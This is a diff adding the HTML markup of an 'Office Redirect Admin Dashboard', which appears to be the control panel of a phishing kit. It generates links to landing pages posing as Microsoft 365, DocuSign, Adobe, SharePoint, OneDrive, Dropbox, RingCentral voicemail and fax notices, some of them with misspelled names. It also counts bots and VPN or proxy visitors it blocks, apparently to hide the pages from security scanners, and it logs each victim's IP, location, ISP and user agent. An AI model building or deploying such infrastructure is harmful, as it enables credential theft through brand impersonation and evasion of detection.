@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Office Redirect Admin Dashboard</title>
+  <link rel="stylesheet" href="admin_style.css">
+</head>
+<body>
+  <header>
+    <h1>Office Redirect Admin Dashboard</h1>
+    <p class="header-subtitle">Monitor & Manage Your Links</p>
+  </header>
+
+  <div class="container">
+    <!-- Statistics Cards -->
+    <section class="stats-grid">
+      <div class="stat-card success">
+        <div class="stat-icon">✓</div>
+        <h3>Real Users</h3>
+        <p class="stat-number" id="realUsers">0</p>
+        <p class="stat-label">Allowed Access</p>
+      </div>
+
+      <div class="stat-card danger">
+        <div class="stat-icon">🤖</div>
+        <h3>Bots Blocked</h3>
+        <p class="stat-number" id="botsBlocked">0</p>
+        <p class="stat-label">Bot Detection</p>
+      </div>
+
+      <div class="stat-card warning">
+        <div class="stat-icon">🔒</div>
+        <h3>VPN/Proxy Blocked</h3>
+        <p class="stat-number" id="vpnBlocked">0</p>
+        <p class="stat-label">Non-Residential IPs</p>
+      </div>
+
+      <div class="stat-card info">
+        <div class="stat-icon">👁</div>
+        <h3>Total Clicks</h3>
+        <p class="stat-number" id="totalClicks">0</p>
+        <p class="stat-label">All Visitors</p>
+      </div>
+    </section>
+
+    <!-- Main Content Grid -->
+    <div class="main-grid">
+      <!-- Link Generator Card -->
+      <div class="card link-generator">
+        <h2>Generate Redirect Link</h2>
+        <div class="form-group">
+          <label for="landingPage">Choose Landing Page:</label>
+          <select id="landingPage">
+            <option value="365.html">Microsoft 365</option>
+            <option value="adobe.html">Adobe</option>
+            <option value="auto_redirect.html">Auto Redirect</option>
+            <option value="office365.html">Office 365</option>
+            <option value="rincentral.html">RingCentral</option>
+            <option value="voice.html">Voice</option>
+            <option value="docu.html">DocuSign</option>
+            <option value="exceel.html">Excel</option>
+            <option value="docsign.html">Docsign</option>
+            <option value="fax_notification.html">Fax Notification</option>
+            <option value="rignce.html">RingCentral Voicemail</option>
+            <option value="sharepoint.html">SharePoint</option>
+            <option value="onedrive.html">OneDrive</option>
+            <option value="drop.html">Dropbox</option>
+          </select>
+        </div>
+        <button onclick="createLink()" class="btn-primary">Generate Link</button>
+        <div id="result"></div>
+      </div>
+
+      <!-- Recent Activity Card -->
+      <div class="card activity-log">
+        <h2>Recent Activity</h2>
+        <div class="activity-controls">
+          <button onclick="filterActivity('all')" class="filter-btn active" data-filter="all">All</button>
+          <button onclick="filterActivity('allowed')" class="filter-btn" data-filter="allowed">Allowed</button>
+          <button onclick="filterActivity('blocked')" class="filter-btn" data-filter="blocked">Blocked</button>
+        </div>
+        <div id="activityLog" class="activity-list">
+          <p class="no-data">No activity yet. Waiting for visitors...</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Detailed Records Table -->
+    <div class="card records-table">
+      <div class="table-header">
+        <h2>Detailed Visitor Records</h2>
+        <div class="table-controls">
+          <button onclick="exportData()" class="btn-secondary">Export CSV</button>
+          <button onclick="refreshData()" class="btn-secondary">Refresh</button>
+        </div>
+      </div>
+      <div class="table-responsive">
+        <table id="recordsTable">
+          <thead>
+            <tr>
+              <th>Time</th>
+              <th>Status</th>
+              <th>IP Address</th>
+              <th>Country</th>
+              <th>City</th>
+              <th>ISP</th>
+              <th>Type</th>
+              <th>Reason</th>
+              <th>User Agent</th>
+            </tr>
+          </thead>
+          <tbody id="recordsBody">
+            <tr>
+              <td colspan="9" class="no-data">No records available</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- Country Distribution -->
+    <div class="card chart-card">
+      <h2>Visitor Distribution by Country</h2>
+      <div id="countryChart" class="chart-container">
+        <p class="no-data">No data available</p>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <p>© 2025 Office Redirect Dashboard | Last Updated: <span id="lastUpdate">Never</span></p>
+  </footer>
+
+  <script src="admin.js"></script>
+</body>
+</html>
